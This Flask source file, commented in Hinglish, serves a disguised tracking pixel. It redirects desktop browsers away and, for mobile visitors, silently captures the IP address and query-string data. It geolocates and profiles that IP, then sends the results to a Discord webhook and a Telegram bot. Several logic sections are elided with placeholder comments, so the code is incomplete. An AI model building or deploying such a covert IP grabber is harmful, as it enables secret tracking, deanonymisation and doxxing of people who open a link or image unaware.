import os
from flask import Flask, request, send_file, redirect
import requests
from datetime import datetime
import io
import json
import socket

app = Flask(__name__)

# --- CONFIGURATION ---
DISCORD_WEBHOOK_URL = os.environ.get('DISCORD_WEBHOOK_URL')
ABUSEIPDB_KEY = os.environ.get('ABUSEIPDB_KEY')
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')

# 1x1 pixel ki transparent GIF image
PIXEL_BYTES = b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'

@app.route('/assets/tracker.gif')
def track():
    print("--- Request Received ---") # Logging Start
    try:
        user_agent = request.headers.get('User-Agent', 'Unknown')
        if 'Windows' in user_agent or 'Macintosh' in user_agent or ('Linux' in user_agent and 'Android' not in user_agent):
            print(f"Desktop user detected. Redirecting. UA: {user_agent}")
            return redirect("https://www.google.com", code=302)

        if not DISCORD_WEBHOOK_URL and not TELEGRAM_BOT_TOKEN:
            print("ERROR: No webhook or bot token configured.")
            return "Configuration error", 500

        # Data Capture
        raw_ip_list = request.headers.get('X-Forwarded-For', request.remote_addr)
        ip_address = raw_ip_list.split(',')[0].strip()
        print(f"Processing IP: {ip_address}")
        
        # ... (baaki saara data capture waisa hi)
        username = request.args.get('username', 'Guest')
        user_message = request.args.get('message', 'N/A')
        # ...

        # IP Intelligence (sab kuch try...except ke andar)
        geo_info, asn_info, hostname, threat_level, risk_color, abuse_score = "N/A", "N/A", "N/A", "Low ✅", 3066993, 0
        # ... (poora IP intelligence logic waisa hi)
        try:
            response_geo = requests.get(f"http://ip-api.com/json/{ip_address}?fields=status,message,country,countryCode,city,isp,as,query", timeout=5)
            # ...
        except Exception as e: print(f"ERROR ip-api: {e}")
        try: hostname = socket.gethostbyaddr(ip_address)[0]
        except Exception: hostname = "Not Found"
        if ABUSEIPDB_KEY:
            try:
                response_abuse = requests.get(f"https://api.abuseipdb.com/api/v2/check?ipAddress={ip_address}", headers={'Key': ABUSEIPDB_KEY, 'Accept': 'application/json'}, timeout=5)
                # ...
            except Exception as e: print(f"ERROR AbuseIPDB: {e}")
        
        # Prepare Notifications
        # ... (Discord embed aur Telegram message banana waisa hi)
        discord_embed = { "description": f"Report for {username}" } # Simplified for brevity
        telegram_message = f"Report for {username}"

        # --- SAFER NOTIFICATION SENDING ---
        if DISCORD_WEBHOOK_URL:
            try:
                print("Sending to Discord...")
                requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [discord_embed]})
                print("Discord notification sent.")
            except Exception as e:
                print(f"FATAL ERROR sending to Discord: {e}")

        if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
            try:
                print("Sending to Telegram...")
                url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
                payload = { 'chat_id': TELEGRAM_CHAT_ID, 'text': telegram_message, 'parse_mode': 'Markdown' }
                requests.post(url, json=payload, timeout=5)
                print("Telegram notification sent.")
            except Exception as e:
                print(f"FATAL ERROR sending to Telegram: {e}")

        print("--- Request Processed Successfully ---")
        return send_file(io.BytesIO(PIXEL_BYTES), mimetype='image/gif')

    except Exception as e:
        print(f"--- UNHANDLED FATAL ERROR in track function: {e} ---")
        return "An internal error occurred", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
